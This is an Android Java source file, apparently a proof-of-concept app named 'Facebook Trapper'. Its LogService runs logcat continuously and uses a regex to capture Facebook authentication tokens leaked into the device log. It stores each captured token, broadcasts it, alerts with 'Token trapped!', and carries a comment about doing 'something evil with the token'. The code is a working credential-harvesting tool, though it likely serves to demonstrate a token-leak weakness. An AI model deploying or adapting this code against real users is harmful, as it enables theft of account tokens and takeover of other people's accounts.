package com.pixplicity.example.facebookthief;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

public class LogService extends Service {

	public static final String SERVICE_QUERY = "com.pixplicity.example.SERVICE_QUERY";
	public static final String SERVICE_RESPONSE = "com.pixplicity.example.SERVICE_RESPONSE";
	public static final String TRAPPER_RESPONSE = "com.pixplicity.example.TRAPPER_RESPONSE";

	private static Thread mThread;

	private final ArrayList<TrapperResult> mResults = new ArrayList<TrapperResult>();
	private QueryReceiver mReceiver;

	private class QueryReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			// Respond to the query
			sendResponse(mThread != null && mThread.isAlive());
			// Send all results
			synchronized (mResults) {
				for (int i = 0; i < mResults.size(); i++) {
					sendResult(mResults.get(i));
				}
			}
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		// The service is first created
		Log.i(LogActivity.TAG, "starting service");
		// Listen to queries to the service
		mReceiver = new QueryReceiver();
		registerReceiver(mReceiver, new IntentFilter(SERVICE_QUERY));
		int id = 0;
		startForeground(id, showNotification(id, "Facebook Trapper running"));
		if (mThread == null || !mThread.isAlive()) {
			mThread = new Thread() {
				int count = 0;
				Pattern pattern = Pattern.compile(TrapperResult.getRegEx());

				@Override
				public void run() {
					Process process = null;
					BufferedReader reader = null;
					try {
						process = Runtime.getRuntime().exec(
								new String[] { "logcat", "-v", "time", "*:V" });
						// Read the process stream
						reader = new BufferedReader(new InputStreamReader(
								process.getInputStream()),
								1024);
						boolean firstLine = true;
						while (!isInterrupted()) {
							final String line = reader.readLine();
							if (firstLine) {
								// The process started; indicate that the
								// service is ready
								sendResponse(true);
								firstLine = false;
							}
							if (line == null) {
								break;
							}
							handleLine(line);
							// Short delay to prevent locking up
							Thread.sleep(10);
						}
					} catch (IOException e) {
						Log.e(LogActivity.TAG, e.getMessage());
						// Something went wrong; abort
					} catch (InterruptedException e) {
						// Stop thread
					} finally {
						if (process != null) {
							process.destroy();
						}
						if (reader != null) {
							try {
								reader.close();
							} catch (IOException e) {
							}
						}
					}
					Log.i(LogActivity.TAG, "service stopped");
					showNotification(-1, "Facebook Trapper stopped");
					stopSelf();
				}

				public void handleLine(final String line) {
					Matcher match = pattern.matcher(line);
					if (match.find()) {
						String interest = null;
						if (match.groupCount() > 1) {
							interest = match.group(1);
						}
						TrapperResult result = new TrapperResult(line, interest);
						if (result.interest != null) {
							showNotification(++count, "Token trapped!", result);
							Log.d(LogActivity.TAG, "found match");
						}
						synchronized (mResults) {
							mResults.add(result);
							// Prune the list
							for (int i = 0; i < Math.max(0, mResults.size()
									- LogActivity.MAX_ITEMS); i++) {
								mResults.remove(0);
							}
						}
						// TODO Do something evil with the token
						// Update the list
						sendResult(result);
					}
				};
			};
			mThread.start();
		}
	}

	@Override
	public void onDestroy() {
		// The service is shutting down
		stop();
	}

	public void stop() {
		Log.i(LogActivity.TAG, "stopping service");
		mThread.interrupt();
		stopForeground(true);
		unregisterReceiver(mReceiver);
		sendResponse(false);
		stopSelf();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return super.onStartCommand(intent, flags, startId);
	}

	protected Notification showNotification(int id, String title) {
		return showNotification(id, title, null);
	}

	protected Notification showNotification(int id, String title,
			TrapperResult result) {
		NotificationManager ns = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
		Notification notification = new Notification(
				R.drawable.ic_launcher, title,
				System.currentTimeMillis());
		boolean cancel = false;
		if (id < 0) {
			id = 0;
			cancel = true;
		}
		final Intent intent;
		if (id == 0) {
			intent = new Intent(this, LogActivity.class);
			notification.flags |= Notification.FLAG_ONGOING_EVENT;
			notification.icon = R.drawable.ic_service;
		} else {
			intent = result.getIntent();
			notification.sound = Uri.parse("android.resource://"
					+ getPackageName() + "/" + R.raw.alarm);
			notification.icon = R.drawable.ic_security;
		}
		PendingIntent contentIntent = PendingIntent
				.getActivity(this, 0, intent, 0);
		notification.setLatestEventInfo(this, title, result == null ? null
				: result.interest, contentIntent);
		ns.notify(id, notification);
		if (cancel) {
			ns.cancel(id);
		}
		return notification;
	}

	private void sendResult(TrapperResult result) {
		Intent intent = new Intent(TRAPPER_RESPONSE);
		intent.putExtra("result", result);
		sendBroadcast(intent);
	}

	private void sendResponse(boolean alive) {
		Intent broadcast = new Intent(SERVICE_RESPONSE);
		broadcast.putExtra("alive", alive);
		sendBroadcast(broadcast);
	}

}
